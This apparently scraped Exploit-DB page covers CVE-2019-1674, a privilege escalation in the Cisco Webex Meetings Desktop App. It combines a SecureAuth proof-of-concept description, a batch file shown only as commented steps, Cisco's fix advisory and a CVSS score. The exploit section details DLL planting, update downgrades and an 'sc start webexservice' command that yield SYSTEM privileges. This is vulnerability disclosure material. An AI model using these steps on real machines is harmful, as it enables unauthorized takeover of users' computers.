Leandro Cuozzo from SecureAuth Advisories Team.

7. *Technical Description / Proof of Concept Code*

7.1. *Privilege Escalation*

[CVE-2019-1674]
The update service of Cisco Webex Meetings Desktop App for Windows does
not properly validate version numbers of new files. An unprivileged
local attacker could exploit this vulnerability by invoking the update
service command with a crafted argument and folder. This will allow the
attacker to run arbitrary commands with SYSTEM user privileges.

The vulnerability can be exploited by copying to a local attacker
controller folder, the atgpcdec.dll binary and rename it as atgpcdec.7z.
Then, a previous version of the ptUpdate.exe file must be compressed as
7z and copied to the controller folder. Also, a malicious dll must be
placed in the same folder, named vcruntime140.dll and compressed as
vcruntime140.7z. Finally, a ptUpdate.xml file must be provided in the
controller folder for the update binary (ptUpdate.exe) to treat our
files as a normal update. To gain privileges, the attacker must start
the service with the command line:
sc start webexservice WebexService 1 989898 "attacker-controlled-path"

Proof of Concept:

The following proof of concept performs a 2 step attack, since starting
from version 33.8.X, the application enforces the checking of signatures
for all the downloaded binaries. This 2 step attack works against all
the mentioned vulnerable packages. Notice that you'll need the previous
versions of the ptUpdate.exe executable. Those versions are:
3307.1.1811.1500 for the first step and 3306.4.1811.1600 for the last
step. To exploit version priot to 33.8.X, only one step is required
(the last step in this PoC).

Batch file:
/-----
@echo off
REM Contents of PoC.bat
REM
REM This batch file will exploit CVE-2019-1674
REM
REM First, it will copy the atgpcdec.dll file from the installation
REM folder to the current folder as atgpcdec.7z. Then, it will backup
REM ptUpdate.exe and vcruntime140.dll files from the installation folder
REM in the current folder, adding .bak to their names. Keep in mind that
REM those files will be replaced (especially, vcruntime140.dll) and if
REM not restored, will render the application useless.
REM
REM The executable ptUpdate.exe version 3307.1.1811.1500 must be
REM compressed as ptUpdate0.7z and present in the current folder.
REM The executable ptUpdate.exe version 3306.4.1811.1600 must be
REM compressed as ptUpdate1.7z and present in the current folder.
REM Both can be generated using 7zip GUI and compressing as 7z, with
REM normal compression level and LZMA compression method.
REM Another way is to compress both files using the command line app:
REM
REM 7z.exe a ptUpdate0.7z ptUpdate.exe -m0=BCJ -m1=LZMA:d=21
REM
REM ptUpdate0.xml file will be used in the first stage of the attack. It
REM will be renamed to ptUpdate.xml. Make sure to check and adjust (if
REM necessary) the "Size" and "PackagedSize" values of the xml, to the
REM ptUpdate0.7z ones. ptUpdate0.7z will be renamed to ptUpdate.7z. Then
REM the update service will be started.
REM
REM The batch will wait until the process (ptUpdate.exe) finishes
REM
REM After the first stage is completeted, it will rename ptUpdate.7z
REM back to ptUpdate0.7z, and ptUpdate.xml to ptUpdate0.xml.
REM
REM Now, ptUpdate1.xml file will be used in the second stage of the
REM attack. It will be renamed to ptUpdate.xml. Also, ptUpdate1.7z will
REM be renamed to ptUpdate.7z. Remember to check and adjust (if
REM necessary) the "Size" and "PackagedSize" values of the xml, to the
REM ptUpdate1.7z ones. Out "malicious" DLL will be generated using
REM certutil.exe and named vcruntime140.7z. It's a simple dll that will
REM execute notepad.exe on load and that has the same exported functions
REM as the original. The update service will be started again.
REM
REM The batch will wait until the process (ptUpdate.exe) finishes
REM
REM Once finished, it will print that the attack is done and wait for a
REM key press. You should see a notepad.exe (2, in fact) with SYSTEM
REM user privileges running.
REM
REM After a key is pressed, the batch will finish removing atgpcdec.7z
REM and vcruntime140.7z. Also it will rename ptUpdate.7z back to
REM ptUpdate1.7z, and ptUpdate.xml to ptUpdate1.xml.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

The vulnerability is due to insufficient validation of user-supplied parameters. An attacker could exploit this vulnerability by invoking the update service command with a crafted argument. An exploit could allow the attacker to run arbitrary commands with *SYSTEM* user privileges.  While the CVSS Attack Vector metric denotes the requirement for an attacker to have local access, administrators should be aware that in Active Directory deployments, the vulnerability could be exploited remotely by leveraging the operating system remote management tools.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.  Affected Products  * Vulnerable Products This vulnerability affects all Cisco Webex Meetings Desktop App releases prior to 33.6.6, and Cisco Webex Productivity Tools Releases 32.6.0 and later prior to 33.0.7, when running on a Microsoft Windows end-user system.  To determine whether a vulnerable version of Cisco Webex Meetings Desktop App is installed on a Windows machine, users can launch the Cisco Webex Meetings application and click the gear icon in the top right of the application window, then choose the **About...** menu entry; a popup window displaying the currently installed version will open. This is also documented in the article [Check the Cisco Webex Meetings Desktop App Version](https://collaborationhelp.cisco.com/article/en-us/0usc4ab).  To determine whether a vulnerable version of Cisco Webex Productivity Tools is installed on a Windows machine, users can right-click the Webex Productivity Tools icon on the Windows taskbar and select **About** from the menu; a popup window displaying the currently installed version will open. This is also documented in the article [Check the Cisco Webex Productivity Tools Version for Windows](https://collaborationhelp.cisco.com/article/en-us/nf387ab). Products Confirmed Not Vulnerable Only products listed in the [Vulnerable Products](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-wmda-cmdinj#vp) section of this advisory are known to be affected by this vulnerability.  Cisco has confirmed that these vulnerabilities do not affect the Apple Mac OS X or Linux versions of these products.  Workarounds  * There are no workarounds that address this vulnerability.  Fixed Software  * Cisco has released free software updates that address the vulnerability described in this advisory. Customers may only install and expect support for software versions and feature sets for which they have purchased a license. By installing, downloading, accessing, or otherwise using such software upgrades, customers agree to follow the terms of the Cisco software license:      <https://www.cisco.com/c/en/us/products/end-user-license-agreement.html>  Additionally, customers may only download software for which they have a valid license, procured from Cisco directly, or through a Cisco authorized reseller or partner. In most cases this will be a maintenance upgrade to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.  When considering software upgrades, customers are advised to regularly consult the advisories for Cisco products, which are available from the [Cisco Security Advisories and Alerts page](https://www.cisco.com/go/psirt), to determine exposure and a complete upgrade solution.  In all cases, customers should ensure that the devices to be upgraded contain sufficient memory and confirm that current hardware and software configurations will continue to be supported properly by the new release. If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers. Customers Without Service Contracts Customers who purchase directly from Cisco but do not hold a Cisco service contract and customers who make purchases through third-party vendors but are unsuccessful in obtaining fixed software through their point of sale should obtain upgrades by contacting the Cisco TAC:   <https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html>  Customers should have the product serial number available and be prepared to provide the URL of this advisory as evidence of entitlement to a free upgrade. Fixed Releases **Cisco Webex Meetings Desktop App (Cisco Webex Meetings Suite WBS33)**      This vulnerability is fixed in Cisco Webex Meetings Desktop App Release 33.6.6 and 33.9.1 releases.      Administrators can update the Cisco Webex Meetings Desktop App for their user base by following the instructions available in the document [IT Administrator Guide for Mass Deployment of the Cisco Webex Meetings Desktop App](https://collaborationhelp.cisco.com/article/en-us/nulpixd).  Users can update the Cisco Webex Meetings Desktop App by launching the Cisco Webex Meetings application and clicking the gear icon in the top right of the application window and then choosing the **Check for Updates** entry from the drop-down list. This is also documented in the article [Update the Cisco Webex Meetings Desktop App](https://collaborationhelp.cisco.com/article/en-us/n1kwkd6).      **Cisco Webex Productivity Tools (Cisco Webex Meetings Suite WBS32)**      This vulnerability is fixed in Cisco Webex Productivity Tools Release 33.0.7.      Cisco Webex Productivity Tools is an optional companion application that allows users to quickly schedule and join meetings from their desktop without the need to access the Meetings website. The application should not be confused with the Cisco Webex Meetings Client, which is the main client application that provides the core functionality to host or attend a Webex meeting.      Administrators can update the Cisco Webex Productivity Tools for their user base by following the instructions available in the document [IT Administrator Guide for Mass Deployment of the Cisco Webex Meetings Desktop App](https://collaborationhelp.cisco.com/article/en-us/nulpixd).

# Common Vulnerability Scoring System

| Choose the version of CVSS calculator:   Version 1  Version 2  Version 3  Version 3.1 |

| Common Vulnerability Scoring System (CVSS) Online Calculator, version 3.0 |
| Vector: CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV: Local AV: Adjacent AV: Network AV: Physical  Select Attack Vector Parameters  Attack Complexity AC: Low AC: High  Select Attack Complexity Parameters  Privileges Required PR: None PR: Low PR: High  Select Privileges Required Parameters  User Interaction UI: Required UI: None  Select User Interaction Parameters  Scope S: Unchanged S: Changed  Select Scope Parameters  Confidentiality Impact C: None C: Low C: High  Select Confidentiality Impact Parameters  Integrity Impact I: None I: Low I: High  Select Integrity Impact Parameters  Availability Impact A: None A: Low A: High  Select Availability Impact Parameters    Base Score: 7.8 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E: Unproven  E: Proof-of-Concept  E: Functional  E: High  E: Not Defined   Select Exploit Code Maturity Parameters  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   Select Remediation Level Parameters  Report Confidence RC: Unknown  RC: Reasonable  RC: Confirmed  RC: Not Defined   Select Report Confidence Parameters     Temporal Score: 7.8 |
| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR: Low  CR: Medium  CR: Not Defined  CR: High   Select Confidentiality Requirement Parameters  Integrity Requirement IR: Low  IR: Medium  IR: Not Defined  IR: High   Select Integrity Requirement Parameters  Availability Requirement AR: Low  AR: Medium  AR: Not Defined  AR: High   Select Availability Requirement Parameters  Modified Attack Vector MAV: Local  MAV: Adjacent  MAV: Network  MAV: Physical  MAV: Not Defined   Select Modified Attack Vector Parameters  Modified Attack Complexity MAC: Low  MAC: High  MAC: Not Defined   Select Modified Attack Complexity Parameters  Modified Privileges Required MPR: None  MPR: Low  MPR: High  MPR: Not Defined   Select Modified Privileges Required Parameters  Modified User Interaction MUI: Required  MUI: None  MUI: Not Defined   Select Modified User Interaction Parameters  Modified Scope MS: Unchanged  MS: Changed  MS: Not Defined   Select Modified Scope Parameters  Modified Confidentiality MC: None  MC: Low  MC: High  MC: Not Defined   Select Modified Confidentiality Parameters  Modified Integrity MI: None  MI: Low  MI: High  MI: Not Defined   Select Modified Integrity Parameters  Modified Availability MA: None  MA: Low  MA: High  MA: Not Defined   Select Modified Availability Parameters    Environmental Score: 7.8 |
